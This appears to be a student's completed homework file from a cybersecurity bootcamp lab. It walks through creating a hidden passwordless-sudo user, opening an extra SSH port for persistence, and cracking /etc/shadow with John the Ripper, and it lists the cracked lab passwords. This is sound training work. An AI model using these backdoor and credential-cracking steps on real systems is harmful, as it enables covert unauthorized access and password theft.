## Week 6 Homework Submission File: Advanced Bash - Owning the System

Please edit this file by adding the solution commands on the line below the prompt. 

Save and submit the completed file for your homework submission.

**Step 1: Shadow People** 

1. Create a secret user named `sysd`. Make sure this user doesn't have a home folder created:
    - adduser --no-create-home sysd

2. Give your secret user a password: 
    - When prompted for password for user, enter the password. I did SupaMar10

3. Give your secret user a system UID < 1000:
    - usermod -u 202 sysd

4. Give your secret user the same GID:
   - groupmod -g 202 sysd

5. Give your secret user full `sudo` access without the need for a password:
   -  visudo
   -  in the sudoers file, append at the end: 
   -  sysd ALL = NOPASSWD: ALL

6. Test that `sudo` access works without your password:
   -  logged in to server as sysd in a new terminal, just to be safe if I made any syntax errors in sudoers

    ```bash
    ssh sysadmin@192.168.6.105 -p 22
    entered password
    sudo su sysd 
    sudo -l
    sudo -u root whoami
    ```
    Both output expected results from someone with sudo access, without asking for a password.

**Step 2: Smooth Sailing**

1. Edit the `sshd_config` file:

    ```bash
    uncomment #Port 22
    
    then add below:
    Port 2222
    ```

**Step 3: Testing Your Configuration Update**
1. Restart the SSH service:
    - `/etc/init.d/ssh restart`

2. Exit the `root` account:
    - `exit`
    - needed to be done a couple of times

3. SSH to the target machine using your `sysd` account and port `2222`:
    - `ssh sysd@192.168.6.105 -p 2222`

4. Use `sudo` to switch to the root user:
    - `sudo su`

**Step 4: Crack All the Passwords**

1. SSH back to the system using your `sysd` account and port `2222`:

    - `ssh sysd@192.168.6.105 -p 2222`

2. Escalate your privileges to the `root` user. Use John to crack the entire `/etc/shadow` file:

    - `sudo su`
    - `john /etc/shadow`

Passwords are:
    stallman - computer
    babbage - freedom
    mitnik - trustno1
    lovelace - dragon
    turing - lakers
    sysadmin - passw0rd
    student - Goodluck!
    
---

© 2020 Trilogy Education Services, a 2U, Inc. brand. All Rights Reserved.

